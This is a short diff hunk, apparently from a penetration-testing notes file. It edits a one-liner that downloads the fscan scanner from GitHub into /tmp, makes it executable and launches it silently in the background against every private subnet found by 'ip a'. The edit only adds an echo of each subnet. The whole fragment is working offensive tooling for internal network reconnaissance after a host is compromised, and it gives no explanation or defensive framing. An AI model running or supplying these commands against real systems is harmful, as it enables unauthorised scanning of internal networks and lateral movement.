@@ -4,7 +4,7 @@ curl -#L https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan -o /tm
 
 ip a| grep -oE "\b(10|172\.(1[6-9]|2\d|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,3}\b" | xargs -I INTRANET bash -c "nohup /tmp/fscan -h INTRANET -o /tmp/results.txt > /dev/null 2>&1 &"
 
-curl -#L https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan -o /tmp/fscan && chmod +x /tmp/fscan && (ip a| grep -oE "\b(10|172\.(1[6-9]|2\d|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,3}\b" | xargs -I INTRANET bash -c "nohup /tmp/fscan -h INTRANET -o /tmp/results.txt > /dev/null 2>&1 &") && echo FscanRunning
+curl -#L https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan -o /tmp/fscan && chmod +x /tmp/fscan && (ip a| grep -oE "\b(10|172\.(1[6-9]|2\d|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,3}\b" | xargs -I INTRANET bash -c "echo INTRANET && nohup /tmp/fscan -h INTRANET -o /tmp/results.txt > /dev/null 2>&1 &") && echo FscanRunning
 
 ```
 
